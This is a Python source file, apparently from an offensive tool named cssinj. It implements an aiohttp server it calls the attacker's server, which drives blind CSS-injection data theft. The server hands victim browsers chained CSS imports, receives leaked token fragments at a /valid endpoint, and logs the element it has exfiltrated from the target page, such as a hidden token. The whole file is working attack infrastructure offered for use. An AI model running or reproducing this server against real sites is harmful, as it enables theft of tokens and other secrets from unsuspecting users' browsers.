from aiohttp import web
import asyncio
from cssinj import console, injection
from cssinj.client import Client, Clients


class CSSInjector:
    def __init__(self):
        self.clients = Clients()

    def start(self, args):
        self.identifier = args.identifier
        self.hostname = args.hostname
        self.port = args.port
        self.show_details = args.details
        self.selector = args.selector
        self.app = web.Application()
        self.app.middlewares.append(self.dynamic_router_middleware)
        web.run_app(
            self.app,
            port=self.port,
            print=console.log(
                "server", f"Attacker's server started on {args.hostname}:{args.port}"
            ),
        )

    async def handle_start(self, request):
        client = Client(
            host=request.remote,
            accept=request.get("accept"),
            user_agent=request.get("user_agent"),
            event=asyncio.Event(),
        )
        self.clients.append(client)
        console.log("connection", f"Connection from {client.host}")
        console.log("connection_details", f"ID : {client.id}")
        client.event.set()
        if self.show_details:
            for key, value in request.headers.items():
                console.log("connection_details", f"{key} : {value}")

        return web.Response(
            text=injection.generate_next_import(self.hostname, self.port, client),
            content_type="text/css",
        )

    async def handle_end(self, request):

        client_id = request.query.get("id")
        client = self.clients[client_id]
        client.elements.append(client.data)
        client.event.set()

        console.log(
            "end_exfiltration",
            f"[{client.id}] - The {self.selector} exfiltrated from {self.identifier} is : {client.data}",
        )

        return web.Response(
            text=f"ok",
            content_type="text/css",
        )

    async def handle_next(self, request):
        client_id = request.query.get("id")
        client = self.clients[client_id]
        client.counter += 1
        if not client.event.is_set():
            await client.event.wait()
        client.event.clear()

        return web.Response(
            text=injection.generate_payload(
                hostname=self.hostname,
                port=self.port,
                identifier=self.identifier,
                selector=self.selector,
                client=client,
            ),
            content_type="text/css",
        )

    async def handle_valid(self, request):
        client_id = request.query.get("id")
        client = self.clients[client_id]

        client.event.set()

        client.data = request.query.get("token")

        if self.show_details:
            console.log(
                "exfiltration",
                f"[{client.id}] - Exfiltrating element {len(client.elements)} : {client.data}",
            )
        return web.Response(text="ok.", content_type="image/x-icon")

    async def dynamic_router_middleware(self, app, handler):
        async def middleware_handler(request):
            path = request.path

            if path.startswith("/start"):
                return await self.handle_start(request)
            elif path.startswith("/next"):
                return await self.handle_next(request)
            elif path.startswith("/valid"):
                return await self.handle_valid(request)
            elif path.startswith("/end"):
                return await self.handle_end(request)

            return web.Response(text="404: Not Found", status=404)

        return middleware_handler
